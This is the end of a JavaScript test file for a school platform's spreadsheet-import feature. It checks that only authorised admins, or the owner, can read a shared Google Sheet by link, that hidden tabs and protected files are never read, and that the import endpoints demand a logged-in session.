const LINK = 'https://docs.google.com/spreadsheets/d/' + SID + '/edit';
throws(() => readS('exec@school.test', LINK), 'FORBIDDEN', 'a teacher cannot read a sheet by link');
throws(() => readS('vp@school.test', 'not a link'), 'INPUT', 'something that is not a Google Sheets link is refused');
throws(() => readS('vp@school.test', 'https://docs.google.com/spreadsheets/d/' + 'Z'.repeat(30) + '/edit'), 'SETUP', "a file the platform's account cannot open is refused, with what to do");
throws(() => readS('vp@school.test', LINK), 'FORBIDDEN', 'an admin cannot read a file that is not shared with their own account');
throws(() => readS('owner@school.test', 'https://docs.google.com/spreadsheets/d/' + MAIN_ID + '/edit'), 'FORBIDDEN', 'the main file is never read this way');
throws(() => readS('owner@school.test', 'https://docs.google.com/spreadsheets/d/' + control.getId() + '/edit'), 'FORBIDDEN', 'nor the control file');
shared.viewers.push('vp@school.test');
const rs = readS('vp@school.test', LINK);
ok(rs.name === 'كشف الموظفين' && rs.tab === 'الموظفون' && rs.rows.length === 3 && rs.rows[1].join() === 'أحمد,ahmad@school.test' && !JSON.stringify(rs).includes('secret-tab'), 'once shared with the admin by name, the first visible tab is read; hidden tabs never are');
ok(readS('vp@school.test', LINK + '#gid=77').tab === 'ثانٍ' && readS('owner@school.test', LINK).rows.length === 3, 'a link to a tab reads that tab; the owner needs no sharing by name');
shared.sheets[1].hidden = true; shared.sheets[2].hidden = true;
throws(() => readS('owner@school.test', LINK), 'GONE', 'a file with no visible tab gives nothing');
ok(post({ fn: 'api_importUsers', args: ['{}'] }).code === 'AUTH' && post({ fn: 'api_readSheet', args: [LINK] }).code === 'AUTH' && post({ fn: 'api_undoImportUsers', args: ['x'] }).code === 'AUTH', 'imports need a session on the website too');
console.log(`${pass} passed, ${failN} failed`); process.exit(failN ? 1 : 0);
